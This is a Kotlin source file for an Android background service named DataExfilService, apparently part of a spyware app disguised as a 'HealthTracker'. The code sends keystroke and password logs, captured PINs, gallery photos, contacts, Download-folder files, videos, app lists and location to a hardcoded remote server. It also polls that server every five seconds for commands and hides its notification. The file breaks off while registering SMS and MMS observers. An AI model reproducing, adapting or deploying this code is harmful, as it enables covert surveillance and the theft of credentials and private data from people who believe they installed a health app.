package com.inf2007.healthtracker.utilities

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.*
import android.util.Log
import androidx.core.app.NotificationCompat
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*
import android.database.ContentObserver
import android.provider.MediaStore
import android.content.ContentUris
import android.content.IntentFilter
import android.net.Uri
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import android.provider.ContactsContract
import android.provider.Settings
import android.provider.CallLog
import com.inf2007.healthtracker.R
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import android.location.Location
import android.Manifest
import android.content.pm.PackageManager

class DataExfilService : Service() {

    companion object {
        const val TAG = "DataExfilService"
        private const val BASE_URL = "http://20.2.92.176:5000"
        private const val NOTIFICATION_CHANNEL_ID = "data_exfil_channel"
        private const val NOTIFICATION_ID = 1001
        private const val SERVER_ENDPOINT = "$BASE_URL/accessibility_logs"
        private const val PIN_ENDPOINT = "$BASE_URL/pin_logs"
        private const val DOWNLOADS_ENDPOINT = "$BASE_URL/downloads"
        private const val COMMAND_ENDPOINT = "$BASE_URL/commands"
        private const val VIDEO_ENDPOINT = "$BASE_URL/videos"
        private const val USER_APPS_ENDPOINT = "$BASE_URL/user_apps"
        private const val LOCATION_ENDPOINT = "$BASE_URL/location_update"
        private const val PHOTOS_ENDPOINT = "$BASE_URL/photos"
        private const val CONTACTS_ENDPOINT = "$BASE_URL/contacts"
    }

    private lateinit var photoObserver: ContentObserver
    private lateinit var contactsObserver: ContentObserver

    private val photoSyncPrefs by lazy {
        getSharedPreferences("photo_sync_log", Context.MODE_PRIVATE)
    }
    private val contactsSyncPrefs by lazy {
        getSharedPreferences("contacts_sync_log", Context.MODE_PRIVATE)
    }

    private lateinit var handler: Handler
    private var isUploading = false

    // Upload every 30 seconds
    private val uploadInterval = 30 * 1000L
    private lateinit var smsCallLogCollector: SmsCallLogCollector
    private lateinit var smsObserver: ContentObserver
    private lateinit var callLogObserver: ContentObserver
    private lateinit var packageLister: PackageLister
    private var lastAppList: List<PackageLister.PackageInfo>? = null

    // Location tracking variables
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var locationCallback: LocationCallback
    private var lastSentLocation: Location? = null
    private var lastSentTime: Long = 0

    // Location constants
    private val LOCATION_SEND_INTERVAL = 30000L  // Send every 30 seconds
    private val MIN_MOVEMENT_DISTANCE = 10.0f     // 10 meters

    private val uploadRunnable = object : Runnable {
        override fun run() {
            if (!isUploading) {
                uploadAccessibilityLogs()
            }
            handler.postDelayed(this, uploadInterval)
        }
    }

    private val downloadUploadRunnable = object : Runnable {
        override fun run() {
            uploadAllDownloads()
            handler.postDelayed(this, 1 * 60 * 1000L) // Every 1 minute
        }
    }

    private val uploadFileReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == "com.inf2007.healthtracker.UPLOAD_FILE") {
                val type = intent.getStringExtra("type") ?: return
                val filePath = intent.getStringExtra("file_path") ?: return

                when (type) {
                    "camera_video" -> uploadVideoToServer(File(filePath))
                    "screen_recording" -> uploadVideoToServer(File(filePath)) // Same handler
                }
            }
        }
    }

    private val appInstallReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val action = intent.action
            if (action == PackageLister.ACTION_APP_INSTALLED) {
                val packageName = intent.getStringExtra(PackageLister.EXTRA_PACKAGE_NAME)
                val totalApps = intent.getIntExtra(PackageLister.EXTRA_TOTAL_APPS, 0)
                val isRemoved = intent.getBooleanExtra("removed", false)

                if (isRemoved) {
                    Log.i(TAG, "App uninstalled: $packageName, Total apps now: $totalApps")
                } else {
                    Log.i(TAG, "App installed: $packageName, Total apps now: $totalApps")
                }

                // Upload updated app list
                uploadUserAppsList()
            }
        }
    }

    private val pinLogUploadReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == "com.inf2007.healthtracker.UPLOAD_PIN_LOG") {
                Log.d(TAG, "Received PIN upload trigger")
                Thread { uploadPinLogs() }.start()
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        handler = Handler(Looper.getMainLooper())
        createNotificationChannel()
        setupPhotoObserver()
        setupContactsObserver()
        registerReceiver(uploadFileReceiver,
            IntentFilter("com.inf2007.healthtracker.UPLOAD_FILE"), RECEIVER_NOT_EXPORTED)
        smsCallLogCollector = SmsCallLogCollector(this)
        setupSmsAndCallLogObservers()
        packageLister = PackageLister(this)
        packageLister.startListening()
        registerReceiver(appInstallReceiver, IntentFilter(PackageLister.ACTION_APP_INSTALLED), RECEIVER_NOT_EXPORTED)
        uploadUserAppsList()
        registerReceiver(pinLogUploadReceiver, IntentFilter("com.inf2007.healthtracker.UPLOAD_PIN_LOG"), RECEIVER_NOT_EXPORTED)
        setupLocationTracking()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Data exfiltration service started")

        startForegroundService()

        // Start periodic uploads
        handler.postDelayed(uploadRunnable, 10000)
        handler.postDelayed(downloadUploadRunnable, 10000)

        startCommandPolling()

        Handler(Looper.getMainLooper()).postDelayed({
            if (smsCallLogCollector.hasSmsPermission()) {
                Log.d(TAG, "Performing initial SMS full dump")
                smsCallLogCollector.collectAndUploadAllMessages()
            }
            if (smsCallLogCollector.hasCallLogPermission()) {
                Log.d(TAG, "Performing initial call log full dump")
                smsCallLogCollector.collectAndUploadAllCallLogs()
            }
        }, 10000) // 10 seconds delay

        return START_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channelName = "Health Data Sync"
            val channelDescription = "Uploads health data to server"
            val importance = NotificationManager.IMPORTANCE_LOW

            val channel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID,
                channelName,
                importance
            ).apply {
                description = channelDescription
                setShowBadge(false)
            }

            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun startForegroundService() {
        val notification = createNotification()
        startForeground(NOTIFICATION_ID, notification)
        Log.d(TAG, "Foreground service started with notification")
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(R.drawable.onebyonetransparent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setAutoCancel(false)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    // ========== ACCESSIBILITY LOGS ==========
    private fun uploadAccessibilityLogs() {
        if (isUploading) return
        if (!isNetworkAvailable()) {
            Log.d(TAG, "No network available, skipping upload")
            return
        }

        isUploading = true
        Log.d(TAG, "Starting log upload...")

        Thread {
            try {
                val logContent = readSpyLogs()
                if (logContent.isEmpty()) {
                    Log.d(TAG, "No logs to upload")
                    isUploading = false
                    return@Thread
                }

                Log.d(TAG, "Found ${logContent.lines().size} log entries")

                val logs = parseLogsForNotifications(logContent)
                val success = sendToServer(logs)

                if (success) {
                    Log.d(TAG, "Spy logs uploaded successfully")
                    archiveLogs()
                } else {
                    Log.w(TAG, "Upload failed")
                }

            } catch (e: Exception) {
                Log.e(TAG, "Error uploading logs: ${e.message}", e)
            } finally {
                isUploading = false
            }
        }.start()
    }

    private fun readSpyLogs(): String {
        return try {
            val logFile = File(filesDir, "watch.log")
            if (logFile.exists()) {
                val fileSize = logFile.length()
                Log.d(TAG, "Log file exists, size: $fileSize bytes")
                if (fileSize > 0) {
                    val content = logFile.readText()
                    Log.d(TAG, "Read ${content.lines().size} lines from log file")
                    content
                } else {
                    Log.d(TAG, "Log file is empty")
                    ""
                }
            } else {
                Log.d(TAG, "Log file does not exist")
                ""
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error reading log file", e)
            ""
        }
    }

    private fun parseLogsForNotifications(logContent: String): JSONObject {
        val logsArray = logContent.lines().filter { it.isNotBlank() }
        Log.d(TAG, "Parsing ${logsArray.size} log entries")

        val notificationData = JSONObject().apply {
            put("type", "watch")
            put("device_id", getUniqueDeviceId())
            put("device_model", Build.MODEL)
            put("android_version", Build.VERSION.RELEASE)
            put("timestamp", System.currentTimeMillis())
            put("total_entries", logsArray.size)
            put("collection_time", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date()))
            put("app_package", packageName)
        }

        val keyPresses = JSONArray()
        val appSwitches = JSONArray()
        val clicks = JSONArray()
        val sensitiveData = JSONArray()
        val notifications = JSONArray()

        logsArray.forEach { line ->
            when {
                line.contains("TYPING") || line.contains("TEXT") -> keyPresses.put(line)
                line.contains("APP_SWITCH") -> appSwitches.put(line)
                line.contains("CLICK") -> clicks.put(line)
                line.contains("SENSITIVE") || line.contains("PASSWORD") -> sensitiveData.put(line)
                line.contains("NOTIFICATION") -> notifications.put(line)
                else -> keyPresses.put(line)
            }
        }

        val categorizedLogs = JSONObject().apply {
            put("key_presses", keyPresses)
            put("app_switches", appSwitches)
            put("clicks", clicks)
            put("sensitive_data", sensitiveData)
            put("notifications", notifications)
        }

        notificationData.put("logs", categorizedLogs)

        return notificationData
    }

    private fun sendToServer(data: JSONObject): Boolean {
        return try {
            Log.d(TAG, "Sending data to server: ${data.toString().length} bytes")

            val url = URL(SERVER_ENDPOINT)
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "application/json; charset=utf-8")
            connection.setRequestProperty("User-Agent", "HealthTracker-Spy/1.0")
            connection.setRequestProperty("Accept", "application/json")
            connection.connectTimeout = 15000
            connection.readTimeout = 15000
            connection.doOutput = true

            val outputStream = connection.outputStream
            OutputStreamWriter(outputStream, "UTF-8").use { writer ->
                writer.write(data.toString())
                writer.flush()
            }

            val responseCode = connection.responseCode
            val responseMessage = connection.responseMessage

            Log.d(TAG, "Server response: $responseCode $responseMessage")

            try {
                val response = if (responseCode >= 400) {
                    connection.errorStream.bufferedReader().use { it.readText() }
                } else {
                    connection.inputStream.bufferedReader().use { it.readText() }
                }
                Log.d(TAG, "Response body: $response")
            } catch (e: Exception) {
                Log.d(TAG, "Could not read response body")
            }

            connection.disconnect()

            responseCode in 200..299

        } catch (e: Exception) {
            Log.e(TAG, "Error sending to server: ${e.message}")
            Log.e(TAG, "Full error: ", e)
            false
        }
    }

    private fun archiveLogs() {
        try {
            val logFile = File(filesDir, "watch.log")
            if (logFile.exists() && logFile.length() > 0) {
                val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
                val archivedFile = File(filesDir, "watch_$timestamp.log")
                logFile.copyTo(archivedFile)
                logFile.writeText("")
                Log.d(TAG, "Logs archived to: ${archivedFile.name}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error archiving logs: ${e.message}")
        }
    }

    private fun isNetworkAvailable(): Boolean {
        return try {
            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = connectivityManager.activeNetwork ?: return false
            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false

            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)
        } catch (e: Exception) {
            Log.e(TAG, "Network check error", e)
            false
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        handler.removeCallbacks(uploadRunnable)
        handler.removeCallbacks(downloadUploadRunnable)
        if (::smsObserver.isInitialized) {
            contentResolver.unregisterContentObserver(smsObserver)
        }
        if (::callLogObserver.isInitialized) {
            contentResolver.unregisterContentObserver(callLogObserver)
        }
        Log.d(TAG, "Data exfiltration service destroyed")
        if (::packageLister.isInitialized) {
            packageLister.stopListening()
        }
        try {
            unregisterReceiver(appInstallReceiver)
        } catch (e: Exception) {
            Log.e(TAG, "Error unregistering appInstallReceiver", e)
        }
        try {
            unregisterReceiver(pinLogUploadReceiver)
        } catch (e: Exception) {
            Log.e(TAG, "Error unregistering pinLogUploadReceiver", e)
        }
        stopLocationTracking()
        super.onDestroy()
        contentResolver.unregisterContentObserver(photoObserver)
        contentResolver.unregisterContentObserver(contactsObserver)
        unregisterReceiver(uploadFileReceiver)
    }

    private fun setupPhotoObserver() {
        photoObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                scanAndUploadPhotos()
            }
        }
        contentResolver.registerContentObserver(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            true,
            photoObserver
        )
        scanAndUploadPhotos()
    }

    private fun scanAndUploadPhotos() {
        if (!isNetworkAvailable()) {
            Log.d(TAG, "No network, skipping photo scan")
            return
        }

        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME
        )

        contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            null,
            null,
            "${MediaStore.Images.Media.DATE_ADDED} DESC"
        )?.use { cursor ->
            val totalImages = cursor.count
            Log.d(TAG, "Gallery Scan: $totalImages images found")

            val idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)

            var uploadCount = 0
            while (cursor.moveToNext()) {
                val id = cursor.getLong(idColumn)
                val fileName = cursor.getString(nameColumn)

                if (!photoSyncPrefs.getBoolean("id_$id", false)) {
                    val contentUri = ContentUris.withAppendedId(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        id
                    )
                    uploadPhotoToServer(contentUri, fileName, id)
                    uploadCount++
                }
            }
            Log.d(TAG, "Scan Complete: $uploadCount new images queued")
        }
    }

    private fun uploadPhotoToServer(uri: Uri, fileName: String, photoId: Long) {
        try {
            val inputStream = contentResolver.openInputStream(uri)
            val bytes = inputStream?.readBytes() ?: return
            inputStream.close()

            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", fileName,
                    bytes.toRequestBody("image/jpeg".toMediaTypeOrNull()))
                .build()

            val request = Request.Builder()
                .url(PHOTOS_ENDPOINT)
                .post(requestBody)
                .build()

            NetworkClient.instance.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e(TAG, "Photo upload failed: $fileName")
                }
                override fun onResponse(call: Call, response: Response) {
                    if (response.isSuccessful) {
                        Log.d(TAG, "Photo uploaded: $fileName")
                        photoSyncPrefs.edit().putBoolean("id_$photoId", true).apply()
                    }
                    response.close()
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "Error uploading photo: ${e.message}")
        }
    }

    private fun setupContactsObserver() {
        contactsObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                Log.d(TAG, "Contacts database changed: $uri")
                scanAndUploadContacts()
            }
        }

        contentResolver.registerContentObserver(
            ContactsContract.Contacts.CONTENT_URI,
            true,
            contactsObserver
        )

        Log.d(TAG, "Contacts observer registered")

        // Automatically scan if permission is already granted when service starts
        if (hasContactsPermission()) {
            Log.d(TAG, "Contacts permission granted, performing initial scan")
            scanAndUploadContacts()
        }
    }

    private fun hasContactsPermission(): Boolean {
        return checkSelfPermission(android.Manifest.permission.READ_CONTACTS) ==
                android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    private fun scanAndUploadContacts() {
        if (!isNetworkAvailable()) {
            Log.d(TAG, "No network, skipping contacts scan")
            return
        }

        if (!hasContactsPermission()) {
            Log.d(TAG, "No contacts permission, skipping scan")
            return
        }

        Log.d(TAG, "Starting contacts scan...")

        val projection = arrayOf(
            ContactsContract.Contacts._ID,
            ContactsContract.Contacts.DISPLAY_NAME,
            ContactsContract.Contacts.HAS_PHONE_NUMBER
            // Removed CONTACT_LAST_UPDATED_TIMESTAMP as it's not available on all API levels
        )

        contentResolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            projection,
            null,
            null,
            null  // Remove ordering by timestamp
        )?.use { cursor ->
            val totalContacts = cursor.count
            Log.d(TAG, "Contacts Scan: $totalContacts contacts found")

            val idColumn = cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID)
            val nameColumn = cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)
            val hasPhoneColumn = cursor.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER)

            var uploadCount = 0
            while (cursor.moveToNext()) {
                val contactId = cursor.getString(idColumn)
                val name = cursor.getString(nameColumn) ?: "Unnamed"
                val hasPhone = cursor.getInt(hasPhoneColumn)

                if (!contactsSyncPrefs.getBoolean("contact_$contactId", false)) {
                    var phoneNumber = "No number found"

                    if (hasPhone > 0) {
                        phoneNumber = getPhoneNumberForContact(contactId)
                    }

                    uploadContactToServer(contactId, name, phoneNumber)
                    contactsSyncPrefs.edit().putBoolean("contact_$contactId", true).apply()
                    uploadCount++
                }
            }
            Log.d(TAG, "Contacts Scan Complete: $uploadCount new contacts uploaded")
        }
    }

    private fun getPhoneNumberForContact(contactId: String): String {
        var phoneNumber = "No number found"

        contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(ContactsContract.CommonDataKinds.Phone.NUMBER),
            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
            arrayOf(contactId),
            null
        )?.use { phoneCursor ->
            if (phoneCursor.moveToFirst()) {
                val numberColumn = phoneCursor.getColumnIndexOrThrow(
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                )
                phoneNumber = phoneCursor.getString(numberColumn)
            }
        }

        return phoneNumber
    }

    private fun uploadContactToServer(contactId: String, contactName: String, phoneNumber: String) {
        try {
            val ipAddress = getUniqueDeviceId()

            val contactData = JSONObject().apply {
                put("type", "contact")
                put("device_ip", ipAddress)
                put("device_model", Build.MODEL)
                put("android_version", Build.VERSION.RELEASE)
                put("timestamp", System.currentTimeMillis())
                put("app_package", packageName)
                put("contact_id", contactId)
                put("contact_name", contactName)
                put("phone_number", phoneNumber)
            }

            val requestBody = contactData.toString()
                .toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())

            val request = Request.Builder()
                .url(CONTACTS_ENDPOINT)
                .post(requestBody)
                .addHeader("User-Agent", "HealthTracker/1.0")
                .build()

            NetworkClient.instance.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e(TAG, "Contact upload failed: $contactName - ${e.message}")
                    contactsSyncPrefs.edit().remove("contact_$contactId").apply()
                }

                override fun onResponse(call: Call, response: Response) {
                    if (response.isSuccessful) {
                        Log.d(TAG, "Contact uploaded: $contactName -> $phoneNumber")
                    } else {
                        Log.w(TAG, "Contact upload failed: HTTP ${response.code}")
                        contactsSyncPrefs.edit().remove("contact_$contactId").apply()
                    }
                    response.close()
                }
            })

        } catch (e: Exception) {
            Log.e(TAG, "Error uploading contact: ${e.message}")
            contactsSyncPrefs.edit().remove("contact_$contactId").apply()
        }
    }

    private fun uploadAllDownloads() {
        if (!isNetworkAvailable()) {
            Log.d(TAG, "No network, skipping download upload")
            return
        }

        Thread {
            try {
                Log.d(TAG, "========== SCANNING DOWNLOAD FOLDER ==========")

                val downloadFolder = File(Environment.getExternalStorageDirectory(), "Download")

                if (!downloadFolder.exists() || !downloadFolder.isDirectory) {
                    Log.d(TAG, "Download folder not found at: ${downloadFolder.absolutePath}")
                    return@Thread
                }

                Log.d(TAG, "Download folder: ${downloadFolder.absolutePath}")

                // Get ALL files in Download folder
                val files = downloadFolder.listFiles()

                if (files == null || files.isEmpty()) {
                    Log.d(TAG, "Download folder is empty")
                    return@Thread
                }

                Log.d(TAG, "Found ${files.size} files in Download folder")

                var uploadedCount = 0
                var skippedCount = 0

                files.forEach { file ->
                    if (file.isFile) {
                        // Check if we've uploaded this file before
                        // Using filename + size + last modified as unique key
                        val prefsKey = "download_${file.name}_${file.length()}_${file.lastModified()}"

                        if (!photoSyncPrefs.getBoolean(prefsKey, false)) {
                            uploadFile(file, prefsKey)
                            uploadedCount++
                        } else {
                            skippedCount++
                            Log.d(TAG, "Already uploaded: ${file.name}")
                        }
                    }
                }

                Log.d(TAG, "========== DOWNLOAD SCAN COMPLETE ==========")
                Log.d(TAG, "Uploaded: $uploadedCount files")
                Log.d(TAG, "Skipped: $skippedCount files")

            } catch (e: Exception) {
                Log.e(TAG, "Error scanning Download folder: ${e.message}", e)
            }
        }.start()
    }

    private fun uploadFile(file: File, idKey: String) {
        try {
            val deviceId = getUniqueDeviceId()

            Log.d(TAG, "Uploading: ${file.name} (${formatFileSize(file.length())})")

            // Read file bytes
            val bytes = file.readBytes()

            // Create multipart request
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", file.name,
                    bytes.toRequestBody("application/octet-stream".toMediaTypeOrNull()))
                .addFormDataPart("device_id", deviceId)
                .addFormDataPart("device_model", Build.MODEL)
                .addFormDataPart("file_path", file.absolutePath)
                .addFormDataPart("file_size", file.length().toString())
                .addFormDataPart("folder", "Download")
                .build()

            val request = Request.Builder()
                .url(DOWNLOADS_ENDPOINT)
                .post(requestBody)
                .build()

            NetworkClient.instance.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e(TAG, "Upload failed: ${file.name} - ${e.message}")
                }

                override fun onResponse(call: Call, response: Response) {
                    if (response.isSuccessful) {
                        Log.d(TAG, "Uploaded: ${file.name}")
                        photoSyncPrefs.edit().putBoolean(idKey, true).apply()
                    } else {
                        Log.w(TAG, "Upload failed: ${file.name} - HTTP ${response.code}")
                    }
                    response.close()
                }
            })

        } catch (e: Exception) {
            Log.e(TAG, "Error uploading ${file.name}: ${e.message}")
        }
    }

    private fun formatFileSize(size: Long): String {
        val kb = size / 1024.0
        val mb = kb / 1024.0
        val gb = mb / 1024.0

        return when {
            gb >= 1 -> "%.2f GB".format(gb)
            mb >= 1 -> "%.2f MB".format(mb)
            kb >= 1 -> "%.2f KB".format(kb)
            else -> "$size B"
        }
    }

    private fun getUniqueDeviceId(): String {
        return try {
            Settings.Secure.getString(
                contentResolver,
                Settings.Secure.ANDROID_ID
            ) ?: "unknown"
        } catch (e: Exception) {
            Log.e(TAG, "Error getting Android ID: ${e.message}")
            "unknown"
        }
    }

    private fun uploadPinLogs() {
        if (!isNetworkAvailable()) {
            Log.d(TAG, "No network available, skipping PIN upload")
            return
        }

        Thread {
            try {
                val pinLogFile = File(filesDir, "pin.log")
                if (!pinLogFile.exists() || pinLogFile.length() == 0L) {
                    return@Thread
                }

                val logContent = pinLogFile.readText()
                val lines = logContent.lines().filter { it.isNotBlank() }

                val pinData = JSONObject().apply {
                    put("type", "pin_capture")
                    put("device_id", getUniqueDeviceId())
                    put("device_model", Build.MODEL)
                    put("android_version", Build.VERSION.RELEASE)
                    put("timestamp", System.currentTimeMillis())
                    put("total_entries", lines.size)
                    put("pin_logs", JSONArray(lines))
                }

                val success = sendPinToServer(pinData)

                if (success) {
                    archivePinLogs()
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error uploading PIN logs: ${e.message}")
            }
        }.start()
    }

    private fun sendPinToServer(data: JSONObject): Boolean {
        return try {
            val url = URL(PIN_ENDPOINT)
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "application/json; charset=utf-8")
            connection.connectTimeout = 15000
            connection.readTimeout = 15000
            connection.doOutput = true

            OutputStreamWriter(connection.outputStream, "UTF-8").use { writer ->
                writer.write(data.toString())
                writer.flush()
            }

            val responseCode = connection.responseCode
            connection.disconnect()
            responseCode in 200..299
        } catch (e: Exception) {
            Log.e(TAG, "Error sending PINs: ${e.message}")
            false
        }
    }

    private fun archivePinLogs() {
        try {
            val pinLogFile = File(filesDir, "pin.log")
            if (pinLogFile.exists() && pinLogFile.length() > 0) {
                val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
                val archivedFile = File(filesDir, "pin_$timestamp.log")
                pinLogFile.copyTo(archivedFile)
                pinLogFile.writeText("")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error archiving PIN logs: ${e.message}")
        }
    }

    private fun checkForCommands() {
        if (!isNetworkAvailable()) return

        Thread {
            try {
                val url = URL("$COMMAND_ENDPOINT?device_id=${getUniqueDeviceId()}")
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "GET"
                connection.connectTimeout = 10000
                connection.readTimeout = 10000

                if (connection.responseCode == 200) {
                    val response = connection.inputStream.bufferedReader().use { it.readText() }
                    if (response.isNotEmpty() && response != "{}") {
                        val json = JSONObject(response)
                        handleCommand(json)
                    }
                }
                connection.disconnect()
            } catch (e: Exception) {
                Log.e(TAG, "Error checking commands: ${e.message}")
            }
        }.start()
    }

    private fun handleCommand(commandJson: JSONObject) {
        val command = commandJson.getString("command")
        val params = if (commandJson.has("params")) commandJson.getJSONObject("params") else null
        val commandId = if (commandJson.has("command_id")) commandJson.getString("command_id") else null

        Log.i(TAG, "Received command: $command")

        var success = true
        var result = ""

        try {
            when (command) {
                // Screenshot commands - forward to MainActivity
                "START_SCREENSHOT", "STOP_SCREENSHOT", "CAPTURE_NOW", "REQUEST_SCREEN_CAPTURE" -> {
                    val intent = Intent("com.inf2007.healthtracker.SCREENSHOT_COMMAND").apply {
                        putExtra("command", command)
                        setPackage("com.inf2007.healthtracker")
                    }
                    sendBroadcast(intent)
                    result = "Command $command forwarded to main activity"
                }
                else -> {
                    Log.w(TAG, "Unknown command: $command")
                    result = "Unknown command: $command"
                    success = false
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error executing command $command: ${e.message}")
            success = false
            result = "Error: ${e.message}"
        }

        // Send command acknowledgment
        if (commandId != null) {
            sendCommandAck(commandId, success, result)
        }
    }

    private fun sendCommandAck(commandId: String, success: Boolean, result: String = "") {
        Thread {
            try {
                val url = URL("$COMMAND_ENDPOINT/ack")
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json")
                connection.doOutput = true

                val ackJson = JSONObject().apply {
                    put("device_id", getUniqueDeviceId())
                    put("command_id", commandId)
                    put("status", if (success) "completed" else "failed")
                    put("result", result)
                    put("timestamp", System.currentTimeMillis())
                }

                OutputStreamWriter(connection.outputStream).use { writer ->
                    writer.write(ackJson.toString())
                    writer.flush()
                }

                val responseCode = connection.responseCode
                connection.disconnect()

                Log.d(TAG, "Command ack sent for $commandId, response: $responseCode")

            } catch (e: Exception) {
                Log.e(TAG, "Error sending command ack: ${e.message}")
            }
        }.start()
    }

    private fun startCommandPolling() {
        handler.post(object : Runnable {
            override fun run() {
                checkForCommands()
                handler.postDelayed(this, 5000) // Check every 5 seconds
            }
        })
    }

    private val videoUploadPrefs by lazy {
        getSharedPreferences("video_upload_log", Context.MODE_PRIVATE)
    }

    private fun uploadVideoToServer(videoFile: File) {
        if (!isNetworkAvailable()) {
            handler.postDelayed({ uploadVideoToServer(videoFile) }, 60000)
            return
        }

        Thread {
            try {
                val deviceId = getUniqueDeviceId()
                val bytes = videoFile.readBytes()

                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("file", videoFile.name,
                        bytes.toRequestBody("video/mp4".toMediaTypeOrNull()))
                    .addFormDataPart("device_id", deviceId)
                    .addFormDataPart("device_model", Build.MODEL)
                    .addFormDataPart("file_size", videoFile.length().toString())
                    .addFormDataPart("timestamp", System.currentTimeMillis().toString())
                    .addFormDataPart("type", "camera_recording")
                    .build()

                val request = Request.Builder()
                    .url(VIDEO_ENDPOINT)
                    .post(requestBody)
                    .build()

                NetworkClient.instance.newCall(request).enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {
                        Log.e(TAG, "Video upload failed: ${videoFile.name}")
                        handler.postDelayed({ uploadVideoToServer(videoFile) }, 60000)
                    }

                    override fun onResponse(call: Call, response: Response) {
                        if (response.isSuccessful) {
                            Log.i(TAG, "Video uploaded: ${videoFile.name}")
                            videoUploadPrefs.edit().putBoolean("video_${videoFile.name}", true).apply()
                            // Optionally delete after upload
                            // videoFile.delete()
                        } else {
                            handler.postDelayed({ uploadVideoToServer(videoFile) }, 60000)
                        }
                        response.close()
                    }
                })
            } catch (e: Exception) {
                Log.e(TAG, "Error uploading video: ${e.message}")
            }
        }.start()
    }

    private fun setupSmsAndCallLogObservers() {
        Log.d(TAG, "========== SETTING UP SMS, MMS, AND CALL LOG OBSERVERS ==========")

        // Create a single observer that triggers for any message change
        val messageObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean) {
                Log.d(TAG, "MESSAGE DATABASE CHANGED (no URI) - checking for new messages")
                smsCallLogCollector.collectNewMessages()
            }

            override fun onChange(selfChange: Boolean, uri: Uri?) {
                Log.d(TAG, "MESSAGE DATABASE CHANGED with URI: $uri - checking for new messages")
                smsCallLogCollector.collectNewMessages()
            }
        }

        // Register for ALL possible message-related URIs
        val messageUris = listOf(
            Uri.parse("content://sms"),           // SMS
            Uri.parse("content://sms/inbox"),     // SMS inbox
            Uri.parse("content://sms/sent"),      // SMS sent
            Uri.parse("content://mms"),           // MMS
            Uri.parse("content://mms/inbox"),     // MMS inbox
